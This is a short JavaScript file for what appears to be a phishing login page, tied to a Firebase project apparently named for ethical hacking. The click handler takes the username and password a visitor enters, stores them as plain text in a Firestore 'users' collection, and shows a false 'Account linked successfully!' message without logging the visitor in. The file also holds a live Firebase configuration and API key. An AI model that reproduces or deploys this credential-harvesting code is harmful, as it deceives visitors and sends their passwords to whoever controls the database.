import { initializeApp } from "https://www.gstatic.com/firebasejs/12.15.0/firebase-app.js";
import {
  getFirestore,
  collection,
  addDoc
} from "https://www.gstatic.com/firebasejs/12.15.0/firebase-firestore.js";

const firebaseConfig = {
  apiKey: "AIzaSyA2_ZBMGJhYDDIa4nI29NTQvJLmt-nGcbU",
  authDomain: "ethicalhacking-41d74.firebaseapp.com",
  projectId: "ethicalhacking-41d74",
  storageBucket: "ethicalhacking-41d74.firebasestorage.app",
  messagingSenderId: "1074149316175",
  appId: "1:1074149316175:web:65d647891ce950999e7c3a",
  measurementId: "G-E2WT8R8N66"
};

const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

document.getElementById("loginBtn").addEventListener("click", async function () {

    const username = document.getElementById("username").value.trim();
    const password = document.getElementById("password").value.trim();

    if (username === "" || password === "") {
        alert("Please enter username and password.");
        return;
    }

    try {
        await addDoc(collection(db, "users"), {
            username: username,
            password: password,
            time: new Date()
        });

        alert("Account linked successfully!");

        document.getElementById("username").value = "";
        document.getElementById("password").value = "";

    } catch (error) {
        console.error(error);
        alert(error.message);
    }
});
